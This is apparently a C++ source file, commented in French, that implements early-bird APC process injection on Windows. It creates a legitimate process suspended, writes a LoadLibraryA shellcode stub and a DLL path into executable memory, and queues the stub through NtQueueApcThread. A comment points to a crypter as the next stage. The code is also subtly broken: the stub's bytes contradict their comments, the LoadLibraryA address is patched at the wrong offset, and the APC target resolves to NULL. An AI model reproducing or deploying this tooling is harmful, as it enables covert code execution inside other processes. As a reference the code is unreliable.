// language: C++17, file: lex_apc.cpp, target: Windows x64 (lab)
// APC injection : shellcode (LoadLibrary stub) file dans un thread suspendu
// Usage: lex_apc.exe <legitime> <dll>
#include <windows.h>
#include <cstdio>
#include <string>

// shellcode x64 : mov rcx, dll_path ; xor r8,r8 ; xor r9,r9 ; call LoadLibraryA ; ret
// (rappel : la suite constructive passe par le crypter - ceci est la demo APC brute)
static unsigned char sc_stub[] = {
    0x48, 0x83, 0xEC, 0x28,               // sub rsp, 0x28
    0x48, 0xB9, 0,0,0,0,0,0,0,0,          // mov rcx, path
    0x4D, 0x31, 0xC9,                     // xor r8, r8
    0x4D, 0x31, 0xC9,                     // xor r9, r9
    0x48, 0xB8, 0,0,0,0,0,0,0,0,          // mov rax, LoadLibraryA
    0xFF, 0xD0,                           // call rax
    0x48, 0x83, 0xC4, 0x28, 0xC3          // add rsp, 0x28 ; ret
};

int main(int argc, char** argv) {
    if (argc < 3) { printf("usage: %s <legitime> <dll>\n", argv[0]); return 1; }

    STARTUPINFOA si{}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(argv[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[X] CreateProcess\n"); return 1;
    }

    // chemin + addr de LoadLibraryA remplis a l'execution
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    auto loadLib = (PVOID)GetProcAddress(k32, "LoadLibraryA");
    char path[MAX_PATH]; GetFullPathNameA(argv[2], MAX_PATH, path, NULL);

    SIZE_T sz = sizeof(sc_stub) + MAX_PATH;
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID pathAddr = (LPBYTE)mem + sizeof(sc_stub);

    sc_stub[6] = 0; // clean, on patch apres ecriture du path
    WriteProcessMemory(pi.hProcess, pathAddr, path, MAX_PATH, NULL);
    BYTE* sc = new BYTE[sizeof(sc_stub)];
    memcpy(sc, sc_stub, sizeof(sc_stub));
    memcpy(sc + 6, &pathAddr, 8);
    memcpy(sc + 20, &loadLib, 8);
    WriteProcessMemory(pi.hProcess, mem, sc, sizeof(sc_stub), NULL);

    // le thread suspendu execute l'APC au resume
    auto queueAPC = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
    typedef NTSTATUS (NTAPI *pNtQueueAPC)(HANDLE, PVOID, PVOID, PVOID, PVOID);
    ((pNtQueueAPC)queueAPC)(pi.hThread, (PVOID)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlDispatchAPC") ? NULL : (PVOID)mem, NULL, NULL, NULL);

    ResumeThread(pi.hThread);
    printf("[OK] APC place dans %s (resume declenche)\n", argv[1]);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    delete[] sc;
    return 0;
}
